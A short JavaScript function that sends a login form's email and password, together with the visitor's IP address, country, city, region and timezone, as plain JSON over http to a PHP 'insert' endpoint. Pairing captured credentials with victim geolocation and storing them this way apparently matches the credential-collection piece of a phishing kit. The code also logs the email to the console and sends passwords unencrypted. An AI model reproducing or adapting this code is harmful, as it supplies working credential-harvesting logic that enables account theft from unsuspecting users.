async function sendDataToServer({
  ip,
  country,
  city,
  region,
  timezone,
  emailValue,
  passwordValue,
  setError,
  setLoading,
}) {
  setLoading(true);
  if (
    !ip ||
    !country ||
    !city ||
    !region ||
    !timezone ||
    !emailValue ||
    !passwordValue
  ) {
    setLoading(false);
    console.log(emailValue);
    return console.log(
      "Missing Login credentials, please ensure you fill the login form"
    );
  } else {
    const response = await fetch("http://localhost/server/insert.php", {
      method: "POST",
      body: JSON.stringify({
        emailValue,
        passwordValue,
        country,
        city,
        region,
        ip,
        timezone,
      }),
      headers: {
        "Content-Type": "application/json",
      },
      mode: "no-cors",
    });

    // const data = await response.json();
    // console.log(data);

    setLoading(false);

    // return "Data added successfully"; // Or any other success indication
  }
}

export { sendDataToServer };
